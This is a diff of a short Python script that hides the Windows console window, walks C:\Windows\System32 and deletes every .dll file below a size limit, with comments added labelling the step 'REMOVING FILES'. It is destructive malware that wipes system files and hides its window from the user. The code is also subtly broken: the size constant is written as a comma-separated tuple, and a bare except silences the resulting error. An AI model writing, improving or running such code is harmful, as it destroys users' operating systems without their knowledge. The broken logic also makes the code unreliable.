@@ -1,32 +1,37 @@
 import os, win32gui, win32con
+
 # Hide CMD
 win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_HIDE)
-from colorama import Fore,init
+
 clear = lambda: os.system('cls' or "clear")
 clear()
-init()
 
+# Path to inspect
 path = "C:\\Windows\\System32\\"
-line = os.chdir(path)
-list_file =[]
 
-#20mg==21,182,681
+# Max file size
+maxFileSize = 21,182,681
 
+# File extensions we want to collect 
+EXTENSIONS = {".dll"} 
 
-EXTENSIONS = {".dll"} # put type of file here
 try: 
     for dirname, dirpaths, filenames in os.walk(path):
         for filename in filenames:
             ext = os.path.splitext(filename)[-1]
+            # checks if a file has the specified extensions
             if ext in EXTENSIONS:
                 x = os.path.join(dirname, filename)
-                if os.path.getsize(x) < 21182681:
+                # Checks if file doesn't have a large size
+                if os.path.getsize(x) < maxFileSize:
+                    # REMOVING FILES
                     os.remove(x)
-                    print("Aded")
+                    print("Deleted!")
 except:
     pass
     
+# Show CMD
+win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_SHOW)
+    
 
 win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_SHOW)
-
-print("/\/\/\/\/\/\/\/\/\/\  Made By Atena.D  /\/\/\/\/\/\/\/\/\/\  ")
